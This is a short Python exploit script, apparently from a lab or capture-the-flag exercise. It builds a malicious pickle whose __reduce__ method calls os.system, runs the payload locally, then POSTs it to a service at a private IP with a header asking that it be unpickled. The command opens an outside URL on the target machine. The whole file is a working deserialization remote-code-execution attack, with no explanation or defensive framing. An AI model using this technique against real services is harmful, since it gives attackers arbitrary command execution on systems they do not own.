import pickle
import base64
import os
import requests

url = 'http://10.10.20.133:65432/yield_data'

#prep cmd
class RCE:
	def __reduce__(self):
		cmd = "xdg-open https://lwlx.xyz/"
		return os.system, (cmd,)

#pickle shit
picklething = pickle.dumps(RCE())
#print result
print(pickle.dumps(RCE()))  
#try and unpickle (and run payload)
print(pickle.loads(picklething)) 
#finally send payload to host
x = requests.post(url, data = picklething, headers = {"serializer": "pickle"})
print(x.text) #res